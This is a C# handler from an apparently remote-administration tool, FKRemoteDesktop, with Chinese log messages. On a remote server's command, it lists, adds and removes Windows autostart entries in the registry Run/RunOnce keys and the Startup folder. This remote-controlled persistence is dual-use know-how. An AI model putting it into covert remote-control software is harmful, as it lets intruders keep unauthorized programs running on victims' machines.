using FKRemoteDesktop.Debugger;
using FKRemoteDesktop.Enums;
using FKRemoteDesktop.Extensions;
using FKRemoteDesktop.Helpers;
using FKRemoteDesktop.Message.MessageStructs;
using FKRemoteDesktop.Message.SubMessages;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;

//--------------------------------------------------------------------------------------
namespace FKRemoteDesktop.Message.SubMessageHandler
{
    public class StartupManagerHandler : IMessageProcessor
    {
        public bool CanExecute(IMessage message) => message is GetStartupItems ||
                                                     message is DoStartupItemAdd ||
                                                     message is DoStartupItemRemove;

        public bool CanExecuteFrom(ISender sender) => true;

        public void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case GetStartupItems msg:
                    Logger.Log(ELogType.eLogType_Debug, "收到服务器消息: GetStartupItems");
                    Execute(sender, msg);
                    break;

                case DoStartupItemAdd msg:
                    Logger.Log(ELogType.eLogType_Debug, "收到服务器消息: DoStartupItemAdd");
                    Execute(sender, msg);
                    break;

                case DoStartupItemRemove msg:
                    Logger.Log(ELogType.eLogType_Debug, "收到服务器消息: DoStartupItemRemove");
                    Execute(sender, msg);
                    break;
            }
        }

        private void Execute(ISender client, GetStartupItems message)
        {
            try
            {
                List<StartupItem> startupItems = new List<StartupItem>();
                using (var key = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.LocalMachine, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"))
                {
                    if (key != null)
                    {
                        foreach (var item in key.GetKeyValues())
                        {
                            startupItems.Add(new StartupItem
                            { Name = item.Item1, Path = item.Item2, Type = EStartupType.eStartupType_LocalMachineRun });
                        }
                    }
                }
                using (var key = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.LocalMachine, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"))
                {
                    if (key != null)
                    {
                        foreach (var item in key.GetKeyValues())
                        {
                            startupItems.Add(new StartupItem
                            { Name = item.Item1, Path = item.Item2, Type = EStartupType.eStartupType_LocalMachineRunOnce });
                        }
                    }
                }
                using (var key = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.CurrentUser, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"))
                {
                    if (key != null)
                    {
                        foreach (var item in key.GetKeyValues())
                        {
                            startupItems.Add(new StartupItem
                            { Name = item.Item1, Path = item.Item2, Type = EStartupType.eStartupType_CurrentUserRun });
                        }
                    }
                }
                using (var key = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.CurrentUser, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"))
                {
                    if (key != null)
                    {
                        foreach (var item in key.GetKeyValues())
                        {
                            startupItems.Add(new StartupItem
                            { Name = item.Item1, Path = item.Item2, Type = EStartupType.eStartupType_CurrentUserRunOnce });
                        }
                    }
                }
                using (var key = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run"))
                {
                    if (key != null)
                    {
                        foreach (var item in key.GetKeyValues())
                        {
                            startupItems.Add(new StartupItem
                            { Name = item.Item1, Path = item.Item2, Type = EStartupType.eStartupType_LocalMachineRunX86 });
                        }
                    }
                }
                using (var key = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce"))
                {
                    if (key != null)
                    {
                        foreach (var item in key.GetKeyValues())
                        {
                            startupItems.Add(new StartupItem
                            { Name = item.Item1, Path = item.Item2, Type = EStartupType.eStartupType_LocalMachineRunOnceX86 });
                        }
                    }
                }
                if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Startup)))
                {
                    var files = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.Startup)).GetFiles();

                    startupItems.AddRange(files.Where(file => file.Name != "desktop.ini").Select(file => new StartupItem
                    { Name = file.Name, Path = file.FullName, Type = EStartupType.eStartupType_StartMenu }));
                }

                client.Send(new GetStartupItemsResponse { StartupItems = startupItems });
            }
            catch (Exception ex)
            {
                client.Send(new SetStatus { Message = $"获取自启动项失败: {ex.Message}" });
            }
        }

        private void Execute(ISender client, DoStartupItemAdd message)
        {
            try
            {
                switch (message.StartupItem.Type)
                {
                    case EStartupType.eStartupType_LocalMachineRun:
                        if (!RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.LocalMachine,
                            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", message.StartupItem.Name, message.StartupItem.Path, true))
                        {
                            throw new Exception("添加自启动项失败");
                        }
                        break;

                    case EStartupType.eStartupType_LocalMachineRunOnce:
                        if (!RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.LocalMachine,
                            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", message.StartupItem.Name, message.StartupItem.Path, true))
                        {
                            throw new Exception("添加自启动项失败");
                        }
                        break;

                    case EStartupType.eStartupType_CurrentUserRun:
                        if (!RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.CurrentUser,
                            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", message.StartupItem.Name, message.StartupItem.Path, true))
                        {
                            throw new Exception("添加自启动项失败");
                        }
                        break;

                    case EStartupType.eStartupType_CurrentUserRunOnce:
                        if (!RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.CurrentUser,
                            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", message.StartupItem.Name, message.StartupItem.Path, true))
                        {
                            throw new Exception("添加自启动项失败");
                        }
                        break;

                    case EStartupType.eStartupType_LocalMachineRunX86:
                        if (!RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.LocalMachine,
                            "SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run", message.StartupItem.Name, message.StartupItem.Path, true))
                        {
                            throw new Exception("添加自启动项失败");
                        }
                        break;

                    case EStartupType.eStartupType_LocalMachineRunOnceX86:
                        if (!RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.LocalMachine,
                            "SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce", message.StartupItem.Name, message.StartupItem.Path, true))
                        {
                            throw new Exception("添加自启动项失败");
                        }
                        break;

                    case EStartupType.eStartupType_StartMenu:
                        if (!Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Startup)))
                        {
                            Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.Startup));
                        }

                        string lnkPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup),
                            message.StartupItem.Name + ".url");
                        using (var writer = new StreamWriter(lnkPath, false))
                        {
                            writer.WriteLine("[InternetShortcut]");
                            writer.WriteLine("URL=file:///" + message.StartupItem.Path);
                            writer.WriteLine("IconIndex=0");
                            writer.WriteLine("IconFile=" + message.StartupItem.Path.Replace('\\', '/'));
                            writer.Flush();
                        }
                        break;
                }
            }
            catch (Exception ex)
            {
                client.Send(new SetStatus { Message = $"添加新自启动项失败: {ex.Message}" });
            }
        }

        private void Execute(ISender client, DoStartupItemRemove message)
        {
            try
            {
                switch (message.StartupItem.Type)
                {
                    case EStartupType.eStartupType_LocalMachineRun:
                        if (!RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.LocalMachine,
                            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", message.StartupItem.Name))
                        {
                            throw new Exception("移除自启动项失败");
                        }
                        break;

                    case EStartupType.eStartupType_LocalMachineRunOnce:
                        if (!RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.LocalMachine,
                            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", message.StartupItem.Name))
                        {
                            throw new Exception("移除自启动项失败");
                        }
                        break;

                    case EStartupType.eStartupType_CurrentUserRun:
                        if (!RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.CurrentUser,
                            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", message.StartupItem.Name))
                        {
                            throw new Exception("移除自启动项失败");
                        }
                        break;

                    case EStartupType.eStartupType_CurrentUserRunOnce:
                        if (!RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.CurrentUser,
                            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", message.StartupItem.Name))
                        {
                            throw new Exception("移除自启动项失败");
                        }
                        break;

                    case EStartupType.eStartupType_LocalMachineRunX86:
                        if (!RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.LocalMachine,
                            "SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run", message.StartupItem.Name))
                        {
                            throw new Exception("移除自启动项失败");
                        }
                        break;

                    case EStartupType.eStartupType_LocalMachineRunOnceX86:
                        if (!RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.LocalMachine,
                            "SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce", message.StartupItem.Name))
                        {
                            throw new Exception("移除自启动项失败");
                        }
                        break;

                    case EStartupType.eStartupType_StartMenu:
                        string startupItemPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), message.StartupItem.Name);

                        if (!File.Exists(startupItemPath))
                            throw new IOException("自启动项文件不存在");

                        File.Delete(startupItemPath);
                        break;
                }
            }
            catch (Exception ex)
            {
                client.Send(new SetStatus { Message = $"移除自启动项失败: {ex.Message}" });
            }
        }
    }
}